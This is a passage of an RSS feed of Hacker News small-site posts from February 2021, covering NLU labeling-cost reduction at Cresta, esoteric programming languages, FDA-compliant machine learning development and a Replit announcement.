<p>Now, these may seem like mistakes that are simple to avoid, but in complex systems, <a href="https://how.complexsystems.fail/">things go wrong all the time</a>. So it’s wise to design assuming that mistakes will happen, both from machines and people. For example, a tired, or rushed developer may not know to hold a lock while calling the new number routine. Having the routine fail in that case will mean that at they discover their mistake quickly.</p>
<p>So we should design our components and interfaces to be safe, and error resistant. And precisely because conventions can be so powerful, we should design them to encourage safe ways of working.</p>
</article></div>]]>
            </description>
            <link>https://ceri.storey.name/posts/2019-08-18-unconventional-safety.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25995786</guid>
            <pubDate>Mon, 01 Feb 2021 23:53:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How we reduced our AI labeling cost by 10x]]>
            </title>
            <description>
<![CDATA[
Score 33 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25995293">thread link</a>) | @antimatter15
<br/>
February 1, 2021 | https://cresta.com/blog/how-we-reduced-our-labeling-cost-by-10x | <a href="https://web.archive.org/web/*/https://cresta.com/blog/how-we-reduced-our-labeling-cost-by-10x">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>At Cresta, we are democratizing expertise for sales and support teams by making every agent an expert. <a href="https://www.cresta.ai/blog/software-that-learns">To distill such expertise into software</a>, we ask top agents to demonstrate, and in turn, help us label best practices. Machine Learning models are then trained for customers to maximize their KPIs. Our models continuously learn what top agents do differently and scale those behaviors across entire teams.</p>
<p>Apart from providing goal-directed suggestions during ongoing live chats which we talked about in our recent <a href="https://cresta.com/blog/action-directed-gpt-2">Action Directed GPT-2 blogpost</a>, another unique feature that Cresta offers is real-time coaching assist. As shown below, Cresta provides personalized coaching at key moments in a live chat, to inculcate the required behaviors for every agent to perform like a top agent.</p>
</div><div><p>The Real-time Coaching and Agent Assist features mentioned above are powered by our Natural Language Understanding (NLU) pipeline, which is responsible for producing models that help us understand and track the state of the conversation as a chat progresses between an agent and a visitor. The 2 most common tasks which our NLU pipeline solves for, are:</p>
<ol>
<li><strong>Intent Classification</strong>: detecting the intent behind each message from both agent and visitor</li>
<li><strong>Chat Driver Classification</strong>: detecting and tracking the main objective behind the visitor reaching out</li>
</ol>
<p>In 2019, as our customer base started to rapidly grow, one of the biggest challenges we faced was the time and effort required to label data required by our NLU Classification pipeline. To scale as a software company, we strive to maximize our speed of developing and iterating on the required models. In this blog post, we share how our classification pipeline evolved over time and how we reduced our labeling cost and efforts by over 10x, while continuously pushing our accuracy benchmarks forward.</p>
<h2>Deep Transfer Learning</h2>
<p>As was the case for most NLP pipelines across the world in 2019, the first big jump in efficiency came with the introduction of Deep Transfer Learning. Transfer learning, in the form of pre-trained language models, has revolutionized the field of NLP, leading to state-of-the-art results on a wide range of tasks. The idea is to first pre-train a model on a large unlabeled dataset using a language modeling objective, and then fine-tune it on a smaller labeled dataset using a supervised task of choice.</p>
<figure id="attachment_19481" aria-describedby="caption-attachment-19481"><a href="https://cresta.com/static/49c936488d40a0a581c63e208c03b817/DeepTransferLearning.svg"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/7dc3d3fbd8815267d9bc196690d81f500c864251/30a8b/static/49c936488d40a0a581c63e208c03b817/deeptransferlearning.svg" alt="deep-transfer-learning" width="1175" height="623"></a><figcaption id="caption-attachment-19481">A loose analogy depicting Deep Transfer Learning with large pre-trained language models</figcaption></figure>
<p>Many practical applications of NLP occur in scenarios where there is a scarcity of labeled data. This is where fine-tuning large pre-trained language models has changed the game completely. These models have shown to be <a href="https://arxiv.org/pdf/1801.06146.pdf" target="_blank" rel="noopener noreferrer" data-token-index="4" data-reactroot="">extremely sample-efficient</a>, capable of achieving good performance on many tasks with only a few hundred labeled samples.</p>
<p>At the start of 2019, with <a href="https://arxiv.org/pdf/1806.08730.pdf" target="_blank" rel="noopener noreferrer" data-token-index="1" data-reactroot="">multi-task learning in NLP</a> increasingly showing <a href="https://www.aclweb.org/anthology/P19-1441.pdf" target="_blank" rel="noopener noreferrer" data-token-index="3" data-reactroot="">great empirical results</a>, we deployed a multi-headed <a href="https://arxiv.org/pdf/1810.04805.pdf" target="_blank" rel="noopener noreferrer" data-token-index="6" data-reactroot="">BERT</a> for all the different tasks in our classification pipeline. As shown in the image below, this enabled us to train all of them together with a shared BERT encoder, maximizing each head’s learning from all the available labeled data. As a result, the final outcome was us reducing the number of labeled samples required per customer while pushing our accuracy benchmarks to previously uncharted regions.</p>
<figure id="attachment_19595" aria-describedby="caption-attachment-19595"><a href="https://cresta.com/static/c32940d6d127c78f2ee15def9fd31c19/MultiTaskModel.svg"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/b06d84f31cd820198db7a8d7d60ec129bdc5da02/572c8/static/c32940d6d127c78f2ee15def9fd31c19/multitaskmodel.svg" alt="MultiTaskModel" width="650" height="544"></a><figcaption id="caption-attachment-19595">Multi-head BERT for multiple NLU classification tasks</figcaption></figure>
<h2>One-vs-all Classification</h2>
<p>Buoyed by the success of the multi-head architecture, we turned our attention to a problem which was proving to be a costly step in our labeling process: handling a <span data-token-index="2" data-reactroot="">growing Label Taxonomy</span>.</p>
<p>For a model to track the state of a conversation using the classifiers described above, not all messages necessarily belong to a class of interest. As depicted in the image below, this meant that the multi-class classifiers which were deployed had a “None” class, to account for any messages that didn’t fall under the existing set of classes of interest. Instead of starting with a minimal set and then iteratively making data-driven additions to the taxonomy for each customer, this multi-class classification problem formulation forced us to spend considerable time upfront determining the granularity and details of the required taxonomy, and carefully defining what constitutes the “None” class – else otherwise, any future iterations on the taxonomy meant re-visiting all the labeled samples under a large “None” class and updating labels as required.</p>
<p>In short, our workflow was highly resistant to any taxonomy changes, which invariably happened as we entered new verticals and iterated with new customers, causing a lot of re-labeling and label quality issues.</p>
<figure id="attachment_19489" aria-describedby="caption-attachment-19489"><a href="https://cresta.com/static/8f33f77cd519328648e22cd7418828c9/Taxonomy.svg"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/ed4f6e9d53dbdc39bfed1638dfa522c57d508b23/39870/static/8f33f77cd519328648e22cd7418828c9/taxonomy.svg" alt="taxonomy" width="1086" height="1107"></a><figcaption id="caption-attachment-19489">“None” class allowing an agent intent classifier to abstain from messages of no interest</figcaption></figure>
<p>To address the above challenge of iterating on a growing label taxonomy, we converted the multi-class classification problem to a <a href="https://www.jmlr.org/papers/volume5/rifkin04a/rifkin04a.pdf" target="_blank" rel="noopener noreferrer" data-token-index="3" data-reactroot="">one-vs-all</a> classification problem using a multi-head architecture. As shown in the image below, each head acted as a binary classifier (True/False) for one of the classes, and a False from all the heads implied the “None” class.</p>
<figure id="attachment_19597" aria-describedby="caption-attachment-19597"><a href="https://cresta.com/static/5f384297bcae22f0b5ff76b621e92618/OneVsAllModel.svg"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/21af77eae2ce7cf1246837df83aa1cf7a2641935/a37a0/static/5f384297bcae22f0b5ff76b621e92618/onevsallmodel.svg" alt="OneVsAllModel" width="650" height="555"></a><figcaption id="caption-attachment-19597">Multi-head BERT for One-vs-all Intent Classification</figcaption></figure>
<p>The above architecture gave us the flexibility of adding more classes as we iterated on the taxonomy required to produce the experience desired by our customers, without having having to re-label our existing dataset each time. This architecture could be used both for a single-task or in a multi-task setting by simply prepending the class name with the task name to create a unique identifier for each head.</p>
<h2>Binary Labeling Interface with Loss Masking</h2>
<p>Data labeling interfaces and best practices, in general, have been an under-researched area – as was touched upon by François Chollet’s recent <a href="https://twitter.com/fchollet/status/1353422914071142400">tweet</a>, which sparked a debate amongst the research community. Our experience while trying to scale Machine Learning for business use-cases, pushed us to consider data curation and labeling as any other research problem we were looking to solve.</p>
<p>Labeling cost has 2 dimensions –&nbsp;the number of labeled samples required and the average time required to “correctly” label a sample. We realized that the effort and cost required to reach a high quality labeled dataset was often turning out to be a costly step requiring multiple quality assurance iterations. With a much more flexible one-vs-all architecture, instead of just looking for ways to reduce the number of labeled samples required by our models, we started iterating on optimizing our labeling interface with the goal of reducing the difficulty of labeling a given sample.</p>
<p>Humans usually have a small attention span, and labeling often can be a very tedious and mundane task. We A/B tested a new labeling interface where labelers would be making a single binary decision at a time, True/False for a pair of (sample, class), determining whether the sample belongs to that class or not.</p>
<figure id="attachment_19479" aria-describedby="caption-attachment-19479"><a href="https://cresta.com/static/659a310e5fce053badfc32f2150dde8e/BinaryLabelingInterface.svg"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/fe846b3dac1d4f4d9fae9261260cd632397cb78a/02ec0/static/659a310e5fce053badfc32f2150dde8e/binarylabelinginterface.svg" alt="binary-labeling-interface" width="650" height="753"></a><figcaption id="caption-attachment-19479">Labeler makes a binary decision and focuses on 1 class at a time with clear labeling guidelines and examples</figcaption></figure>
<p>A labeler could pick a class they wanted to focus on and the interface would present a sample to be labeled in a binary fashion, accompanied by clear labeling guidelines and examples, as shown in the image above. This interface allowed labelers to think about one class at a time, resulting in a lower cognitive load for them, while also allowing us to scale and distribute the labeling tasks more efficiently among the labelers. Our results showed that this interface resulted in ~2x faster labeling, with fewer mistakes made by the labelers.</p>
<p>Integrating the Binary Labeling Interface with our one-vs-all architecture meant we had to solve 1 problem: there was no guarantee that for a given sample, all the classes would be labeled. More explicitly, given the large amount of unlabeled data we usually work with, the design choice of labeling one class per sample meant that it was highly likely that for a given labeled sample in our training set, we would not have a supervision signal for all the heads. To address this, we implemented Loss Masking, where for a given sample we masked the loss for all the heads we didn’t have a label for. As demonstrated in the image below, for each sample, the loss is only applied to heads for which we have a label in the training batch.</p>
<figure id="attachment_19624" aria-describedby="caption-attachment-19624"><a href="https://cresta.com/static/f9db1b2a9ad8afa293ecf0eaf6356e67/LossMasking.svg"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/68b42654328635ee23f9cb533634466d86347fb6/1705a/static/f9db1b2a9ad8afa293ecf0eaf6356e67/lossmasking.svg" alt="LossMasking" width="1180" height="868"></a><figcaption id="caption-attachment-19624">Loss masking to handle sparse labels for different heads</figcaption></figure>
<h2>Active Learning</h2>
<p>Next, we turned our attention towards pushing the boundary around how sample-efficient Deep Transfer Learning could be, by introducing Active Learning in the pipeline. Our goal was to explore what can be achieved both in terms of accuracy and the associated labeling cost when these large pre-trained language models are used in conjunction with Active Learning techniques.</p>
<p>Similar to how humans learn, giving a model the power to interactively query a human to obtain labels at certain data points – i.e. introducing human guidance at various intervals – can dramatically improve the learning process. This is the key idea behind <a href="https://en.wikipedia.org/wiki/Active_learning_(machine_learning)" target="_blank" rel="noopener noreferrer" data-token-index="3" data-reactroot="">Active Learning</a>: that a machine learning algorithm can achieve greater accuracy with fewer training labels if it is allowed to choose the data from which it learns.</p>
<figure id="attachment_19613" aria-describedby="caption-attachment-19613"><a href="https://cresta.com/static/2123331ca4ae632e8022d3d8eb8c5b65/ActiveLearningPlot.svg"><img loading="lazy" src="https://d33wubrfki0l68.cloudfront.net/44b66a594734fd9b8905fa5fccd4e340ec8a1462/32156/static/2123331ca4ae632e8022d3d8eb8c5b65/activelearningplot.svg" alt="ActiveLearningPlot" width="1242" height="352"></a><figcaption id="caption-attachment-19613">As described in the above plot using a toy dataset, choosing the optimal data points to label can dramatically reduce the amount of labeled data the model might need (<a href="http://burrsettles.com/pub/settles.activelearning.pdf">Image credits</a>)</figcaption></figure>
<p>Active Learning is an iterative process, which can be described by the following steps</p>
<ul>
<li><strong>Step 1</strong>: Label a small set of data, instead of investing huge labeling resources and cost upfront</li>
<li><strong>Step 2</strong>: Train a model on the above and then use it to predict outputs on unlabeled data</li>
<li><strong>Step 3</strong>: From the predictions, select data points based on a sampling strategy (for example Uncertainty Sampling – which selects data points the model is most uncertain about) and label those to include in the training dataset</li>
<li><strong>Step 4</strong>: (Back to Step 2) Retrain the model with the updated dataset and repeat the rest of the steps until a satisfactory quality is achieved</li>
</ul>
<h2>Wor…</h2></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cresta.com/blog/how-we-reduced-our-labeling-cost-by-10x">https://cresta.com/blog/how-we-reduced-our-labeling-cost-by-10x</a></em></p>]]>
            </description>
            <link>https://cresta.com/blog/how-we-reduced-our-labeling-cost-by-10x</link>
            <guid isPermaLink="false">hacker-news-small-sites-25995293</guid>
            <pubDate>Mon, 01 Feb 2021 22:57:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Microsoft Security Adventures Game]]>
            </title>
            <description>
<![CDATA[
Score 27 | Comments 7 (<a href="https://news.ycombinator.com/item?id=25995146">thread link</a>) | @technion
<br/>
February 1, 2021 | https://mssecurityadventure.com/game.html | <a href="https://web.archive.org/web/*/https://mssecurityadventure.com/game.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://mssecurityadventure.com/game.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25995146</guid>
            <pubDate>Mon, 01 Feb 2021 22:43:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Esoteric Programming Languages – The Obscure and Unconventional]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25993381">thread link</a>) | @azhenley
<br/>
February 1, 2021 | https://thecodebytes.com/esoteric-programming-languages/ | <a href="https://web.archive.org/web/*/https://thecodebytes.com/esoteric-programming-languages/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article id="post-863"><header> <img width="1280" height="800" src="https://thecodebytes.com/wp-content/uploads/2020/11/computer-3163436_1280.png" alt="Esoteric Programming Languages" loading="lazy" srcset="https://thecodebytes.com/wp-content/uploads/2020/11/computer-3163436_1280.png 1280w, https://thecodebytes.com/wp-content/uploads/2020/11/computer-3163436_1280-300x188.png 300w, https://thecodebytes.com/wp-content/uploads/2020/11/computer-3163436_1280-1024x640.png 1024w, https://thecodebytes.com/wp-content/uploads/2020/11/computer-3163436_1280-768x480.png 768w" sizes="(max-width: 1280px) 100vw, 1280px" data-srcset="https://thecodebytes.com/wp-content/uploads/2020/11/computer-3163436_1280.png 1280w, https://thecodebytes.com/wp-content/uploads/2020/11/computer-3163436_1280-300x188.png 300w, https://thecodebytes.com/wp-content/uploads/2020/11/computer-3163436_1280-1024x640.png 1024w, https://thecodebytes.com/wp-content/uploads/2020/11/computer-3163436_1280-768x480.png 768w" data-src="https://thecodebytes.com/wp-content/uploads/2020/11/computer-3163436_1280.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></header><section><h2>Introduction</h2> We all know that programming languages can be incredibly useful tools. However, what if there were languages that were not created to be used? Ones that test the boundaries of programming language design and cause even the most experienced programmers to bang their heads against the wall trying to build a simple program? Enter esoteric programming languages.<h2>What Are Esoteric Programming Languages?</h2> Most programming languages are designed for the purpose of widespread use and productivity. However, Esoteric programming languages (esolang) are a segment of programming languages that are not built for usability, but rather for entertainment, artistic intent, or to prove a concept. The word "esoteric" is <a href="https://www.etymonline.com/word/esoteric" target="_blank" rel="noopener noreferrer">derived from the Greek word "esoterikos"</a>, which means “belonging to an inner circle”. Esoteric languages are not intended to be widely understood.<h2>The Purpose of Esoteric Languages</h2> The first-ever esoteric programming language was <a href="http://catb.org/~esr/intercal/" target="_blank" rel="noopener noreferrer">INTERCAL</a>. A parody created by <a href="https://en.wikipedia.org/wiki/Don_Woods_(programmer)" target="_blank" rel="noopener noreferrer">Don Woods</a> and James M. Lyon in 1972 that mimicked popular languages at the time, such as <a href="https://stackoverflow.blog/2020/04/20/brush-up-your-cobol-why-is-a-60-year-old-language-suddenly-in-demand/">COBOL.</a> The idea was later revived in 1993 when Wouter van Oortmerssen designed <a href="http://strlen.com/false-language/" target="_blank" rel="noopener noreferrer">FALSE</a>. The concept was to build a powerful, tiny implementation (compiler executable of 1024 bytes) programming language with an obfuscated syntax that was disorienting to its users. From here, more recognizable names such as <a href="https://esolangs.org/wiki/Brainfuck" target="_blank" rel="noopener noreferrer">brainfuck</a> and <a href="https://esolangs.org/wiki/Befunge" target="_blank" rel="noopener noreferrer">Befunge</a> began to emerge and the concept of esoteric languages began to take shape as a concept.  As previously stated, esoteric languages have four main purposes. To act as a proof of concept, for competitive sport, display an artistic process and simply for entertainment. To better grasp these ideas, let's look into each of them with an example language.<h3>Proof of Concept (Brainfuck)</h3> The first purpose of esoteric languages we are going to look at is proof of concept. A language that was able to present a proof of concept to the computer science community was <a href="https://esolangs.org/wiki/Brainfuck" target="_blank" rel="noopener noreferrer">Brainfuck.</a> A minimalist programming language that contains an astonishing eight characters in total while still proving to be <a href="https://medium.com/@evinsellin/what-exactly-is-turing-completeness-a08cc36b26e2" target="_blank" rel="noopener noreferrer">Turing-complete</a>. The language should not be used for practical projects due to its complexity at scale (as the name suggests). However, it is interesting to see that a programming language can have its utilities with such a small amount of primitives. Here is an example of the language:  <h3>Competitive (Malbolge)</h3> Esoteric languages can also be viewed in a competitive context, such as Malbolge. Languages like Malbolge were created with the sole intent to be exceptionally incomprehensible and difficult to use. Achieved through self-modification, non-intuitive operators and encryption, Malbolge is one of the hardest programming languages to learn. It also very well could be the first of its kind for this purpose in mind. The competition revolving around Malbolge is contained within the premise of the language. That anyone able to make a useful program with Malbolge deserves bragging rights. Here's a sample of how difficult the language is to use.  <h3>Artistic (Shakespeare)</h3> The third purpose of esolang's are for artistic purposes. A popular example of this is the <a href="http://shakespearelang.com/" target="_blank" rel="noopener noreferrer">Shakespeare language</a>. A unique programming language that is meant to resemble the writing from Shakespearean plays. The language is unique, as it redefines the entire programming paradigm. Instead of focusing on producing an intended result, the goal is to make the code itself look more elegant. If only all our code looked as clean as this!  <h3>Entertainment (COW)</h3> Finally, some esoteric programming languages are simply meant to be entertaining.&nbsp; Such as the <a href="https://esolangs.org/wiki/COW" target="_blank" rel="noopener noreferrer">COW language by Sean Heber</a>. As a derivative of the Brainfuck language mentioned above, COW only has 12 primitive. All of which are different capitalizations of the word 'moo'. It's hard to imagine why someone would go through so much effort to create this language. In a way, this comical language really does grasp what programming is all about: incredibly frustrating, a little silly and most importantly, fun.  <h2>The Interesting Thing About Esoteric Languages</h2> So that's pretty much all you need to know about esoteric programming languages. In a strange way, they are like the 'conceptual art' of the programming world. Unconventional and weird, but often thought-provoking and fascinating. Esoteric languages break the recycled formula that most conventional languages follow. Making me believe that these languages could one day be the key to new applications of programming.  Although, if nothing else, they are fascinating designs to look at. Which remain untouched over years, without the over looming necessity to stay 'current' like the majority of popular languages today. Allowing them to only become more interesting with age.  You can check out a full list of esoteric programming languages, <a href="https://esolangs.org/wiki/Language_list" target="_blank" rel="noopener noreferrer">here.</a> If you have anything to add, I would love to hear it in the comment section below!  If you are a programmer that is interested in making passive income, <a href="https://thecodebytes.com/make-passive-income-programming-5-incomes-for-software-developers/">check out this</a>.  Most of the insights I gathered from this post were from <a href="https://esolangs.org/wiki/Main_Page" target="_blank" rel="noopener noreferrer">esolangs.org</a> and <a href="https://morr.cc/esolangs/esolangs.pdf" target="_blank" rel="noopener noreferrer">Esoteric Programming Languages by Sebastian Morr</a>.  Happy coding everyone!  &nbsp;</section></article></div></div>]]>
            </description>
            <link>https://thecodebytes.com/esoteric-programming-languages/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25993381</guid>
            <pubDate>Mon, 01 Feb 2021 20:27:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unbroken Enigma Message]]>
            </title>
            <description>
<![CDATA[
Score 92 | Comments 40 (<a href="https://news.ycombinator.com/item?id=25992462">thread link</a>) | @akakievich
<br/>
February 1, 2021 | https://enigma.hoerenberg.com/index.php?cat=Unbroken | <a href="https://web.archive.org/web/*/https://enigma.hoerenberg.com/index.php?cat=Unbroken">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://enigma.hoerenberg.com/index.php?cat=Unbroken</link>
            <guid isPermaLink="false">hacker-news-small-sites-25992462</guid>
            <pubDate>Mon, 01 Feb 2021 19:20:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How we develop FDA-compliant machine learning algorithms]]>
            </title>
            <description>
<![CDATA[
Score 57 | Comments 35 (<a href="https://news.ycombinator.com/item?id=25992363">thread link</a>) | @yshrestha
<br/>
February 1, 2021 | https://innolitics.com/articles/machine-learning-development-for-medical-devices/ | <a href="https://web.archive.org/web/*/https://innolitics.com/articles/machine-learning-development-for-medical-devices/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <div>
    
    <p>
      by Grace Adams and Yujan Shrestha on January 26, 2021
    </p>
    
    <p>Want to know how we develop safe, effective, and FDA compliant machine learning algorithms? This article describes how we develop machine learning algorithms, points out common pitfalls, and makes documentation recommendations.</p>

<p>When developing a machine learning or AI algorithm, it’s easy to become overly focused on making the best model possible. While model performance is important, to incorporate the model into a commercial medical device, you’ll need to be able to demonstrate to the FDA that the model is safe and effective. Therefore, it’s critical to thoroughly document the algorithm’s development lineage in your design history file. The process outlined in this article will help you do this. We’ve used it to develop AI algorithms within a recently 510(k)-cleared class-II medical device for one of our clients.</p>

<p>The FDA released its <a href="https://www.fda.gov/media/145022/download"><em>Artificial Intelligence/Machine Learning (AI/ML)-Based Software as a Medical Device (SaMD) Action Plan</em></a> in January of 2021. In it, they discuss upcoming changes to their approach for regulating ML-based medical devices. The exact details aren’t public, but we suspect following a consistent development process will be part of it.</p>
      <h2 id="focus-on-process-documentation">
        
        
          Focus on process documentation <a href="#focus-on-process-documentation">🔗</a>
        
        
      </h2>

<p>Our AI development process includes generating reports that detail the input data, model performance, and model selection process. These reports streamline model development by helping developers recognize and correct some of the most common pitfalls in algorithm development, thereby increasing confidence in the AI/ML algorithm’s safety and efficacy. As a convenient side effect, these reports are a powerful tool when designing a QMS suitable for AI and navigating the FDA clearance process.</p>
    
      <h3 id="some-common-pitfalls-we-have-identified-are">
        
        
          Some common pitfalls we have identified are: <a href="#some-common-pitfalls-we-have-identified-are">🔗</a>
        
        
      </h3>

<ul>
  <li>Laser-focus on chasing higher accuracy metrics and forgetting about the business, clinical, and regulatory context</li>
  <li>Errors in data import and preprocessing</li>
  <li>Clinically unrealistic data augmentation</li>
  <li>Algorithm performance metrics—such as the Dice score—are not a perfect proxy to clinical performance but are treated as such</li>
  <li>Data leakage or improper training/validation splits leads to undetectable overfitting and a false sense of stellar algorithm performance</li>
  <li>Using data that was acquired with non-clinical (research) protocols that are too different from the device’s intended use thereby leading to regulatory risk. <sup><a href="#acknowledgments">1</a></sup></li>
  <li>Not being aware of sampling bias in the data thereby leading to regulatory risk. For example, certain age groups may be underrepresented or certain scanner vendors may be overrepresented. <sup><a href="#acknowledgments">1</a></sup></li>
</ul>
    
      <h3 id="these-pitfalls-can-be-mitigated-by-the-following-reports">
        
        
          These pitfalls can be mitigated by the following reports: <a href="#these-pitfalls-can-be-mitigated-by-the-following-reports">🔗</a>
        
        
      </h3>

<ul>
  <li>Input Verification Report</li>
  <li>Data Augmentation Quality Assurance Report</li>
  <li>Model Performance Report</li>
  <li>Model Comparison Report</li>
</ul>
    
      <h3 id="input-verification-report">
        
        
          Input Verification Report <a href="#input-verification-report">🔗</a>
        
        
      </h3>

<p>The input verification report should visualize the dataset as close to the model training step as possible. A common source of error can be simple data processing errors. This report is also an excellent way to verify the quality of the data. If the input data is not very accurate to start with, it will be hard to train an accurate model. In other words, “garbage in equals garbage out.”</p>

<p><a href="http://innolitics.com/innolitics.github.io.downloads/2021-01-26-machine-learning-development-for-medical-devices/Input_Verification_Report.pdf">Click here to view an example</a></p>
    
      <h3 id="data-augmentation-quality-assurance-qa-report">
        
        
          Data Augmentation Quality Assurance (QA) Report <a href="#data-augmentation-quality-assurance-qa-report">🔗</a>
        
        
      </h3>

<p>Data augmentation is a powerful technique that effectively increases the size of your dataset, reducing the risk of overfitting and increasing accuracy. However, going overboard with data augmentation techniques could distort the images beyond realistic boundaries. The data augmentation QA report takes a random sample of the dataset and produces several augmentations of that image and its annotations. This report allows you to confirm the augmented images are still clinically valid and that the annotations—such as segmentations and fiducial markers—are augmented properly.</p>

<p><a href="http://innolitics.com/innolitics.github.io.downloads/2021-01-26-machine-learning-development-for-medical-devices/Data_Augmentation_QA_Report.pdf">Click here to view an example</a></p>
    
      <h3 id="model-performance-report">
        
        
          Model Performance Report <a href="#model-performance-report">🔗</a>
        
        
      </h3>

<p>The model performance report can vary greatly depending on the problem. However, there are four essential properties that this report should have:</p>

<ol>
  <li>Training graphs: These graphs should show how the accuracy and loss metrics develop from epoch to epoch for the training and validation set. They can help you determine if the model converges, when it begins to overfit, and the likelihood of data leakage.</li>
  <li>Statistics table: This table shows any relevant information for the model, such as the training set accuracy at the end of the last training epoch, the validation set accuracy, and the number of parameters in the model.</li>
  <li>Model Architecture: Information about the structure of the model itself. Tensorflow has a built-in function for visualizing this quickly.</li>
  <li>Visualized Inference: This portion of the report will look a lot like the input verification report for the validation set, but it will also include both the human and AI annotations. We place the worst performers at the top of the report to help focus analysis and subsequent iteration.</li>
</ol>

<p><a href="http://innolitics.com/innolitics.github.io.downloads/2021-01-26-machine-learning-development-for-medical-devices/Model_Output_Verification_Report.pdf">Click here to view an example</a></p>
    
      <h3 id="model-comparison-report">
        
        
          Model Comparison Report <a href="#model-comparison-report">🔗</a>
        
        
      </h3>

<p>During the development of any ML model, there are likely to be hundreds of models trained, each with different hyperparameters, data augmentations, or even different architecture configurations. Additionally, model improvements are likely to be made in the post-market phase as more data is acquired and newer ML techniques are discovered. Therefore, it is essential to have a way to compare multiple models so that you can empirically determine which model performs better. The model comparison report includes the training graphs for each of the models, a statistics table for easy model comparison, and the inferences from each of the models on the same validation dataset. Visualizing all of the different models’ inferences is particularly important since the loss function alone is not the full story. For example, a model with worse metrics could be because it is actually finding more human annotation errors than the others.</p>

<p><a href="http://innolitics.com/innolitics.github.io.downloads/2021-01-26-machine-learning-development-for-medical-devices/Models_Comparison_Report.pdf">Click here to view an example</a></p>
    
      <h2 id="the-process">
        
        
          The Process <a href="#the-process">🔗</a>
        
        
      </h2>

<p>The process we have developed is rooted in the idea that good machine learning practices will lead to algorithms that will generalize to a real clinical setting and thus be safe and reliable. Here I’ll use an example project, segmenting the lungs in chest x-rays, to go step-by-step through our development process. I’ll be detailing the use of the four reports and pointing out common sources of errors along the way.</p>
    
      <h2 id="step-1-problem-definition">
        
        
          Step 1: Problem definition <a href="#step-1-problem-definition">🔗</a>
        
        
      </h2>

<p>When beginning any project, it is vital to understand the goals and limitations. We work closely with our clients to make sure that we can meet all their requirements. Some important considerations are:</p>

<ul>
  <li>Speed: Should this run on an embedded device? Should inference be possible without a GPU? How many concurrent inferences are necessary and on what hardware?</li>
  <li>Accuracy: What accuracy do we think is necessary for a clinically useful model? If an algorithm suggests a segmentation for the physician to edit, the minimum accuracy threshold is probably lower than if the algorithm’s segmentations are used directly for diagnosis. A risk analysis coupled with a literature review can help determine this threshold.</li>
  <li>Development budget: Where should we be on the 80/20 rule? Each .9% added to the accuracy target will scale the cost exponentially. Should we use off the shelf architectures or something more customized? How fast do we need to develop the model? Is this a feasibility study, or do we need to observe more rigorous medical device design controls?</li>
</ul>

<p><em>Example: For the Lung Segmentation problem, it doesn’t need to run on an embedded device and should always have access to a GPU. The goal is to make the model as accurate as possible, but there will usually be several inferences running concurrently. Ideally, the model will be as small as possible without sacrificing accuracy, as inferences time is related to model size. The budget and timeline are limited, so existing architecture implementations are preferred.</em></p>
    
      <h2 id="step-2-get-data">
        
        
          Step 2: Get data <a href="#step-2-get-data">🔗</a>
        
        
      </h2>

<p>The data used to train and test the model is an essential part of ML development. If a client already has a dataset ready to go, that’s great! But if not, we are happy to connect them with tools and services for image annotation as needed.</p>

<p><em>Example: I chose to go with a dataset from Kaggle, a machine learning hub where users can find and publish datasets and other resources to advance the data science field. Link to the dataset I used: https://www.kaggle.com/nikhilpandey360/chest-xray-masks-and-labels</em></p>
    
      <h2 id="step-3-data-partition-strategy">
        
        
          Step 3: Data partition strategy <a href="#step-3-data-partition-strategy">🔗</a>
        
        
      </h2>

<p>Once we have a dataset, there are several data processing steps to get it into a form readily consumable by ML. Usually, this involves splitting the dataset into training, validation, and test sets.</p>

<p>First, we work with our client to set aside a test set. The test set should be reasonably representative of the data commonly seen in clinical scenarios. It will not be used at all during model training. Instead, we will use it to see how well the algorithm performs on unseen data. It will also be the “acceptance criteria” used for the final deliverable and to verify the validity of incremental changes in future versions of the model.</p>

<p>After setting aside the test set, we split the remaining data into …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://innolitics.com/articles/machine-learning-development-for-medical-devices/">https://innolitics.com/articles/machine-learning-development-for-medical-devices/</a></em></p>]]>
            </description>
            <link>https://innolitics.com/articles/machine-learning-development-for-medical-devices/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25992363</guid>
            <pubDate>Mon, 01 Feb 2021 19:14:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Going Global]]>
            </title>
            <description>
<![CDATA[
Score 58 | Comments 22 (<a href="https://news.ycombinator.com/item?id=25991988">thread link</a>) | @tosh
<br/>
February 1, 2021 | https://blog.repl.it/global | <a href="https://web.archive.org/web/*/https://blog.repl.it/global">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>We had the idea for Replit in Jordan, launched as a startup in New York, and incorporated as a company in San Mateo. The US gave us the infrastructure, the capital, and network to launch our business, and for that we're forever grateful. However, to us, the internet is a <a href="https://www.eff.org/cyberspace-independence">new country</a> and we want to make our citizenship official and our commitment real. We're joining our global community of hackers, students, teachers, and entrepreneurs and becoming a global company and service. Starting today:</p>
<ul>
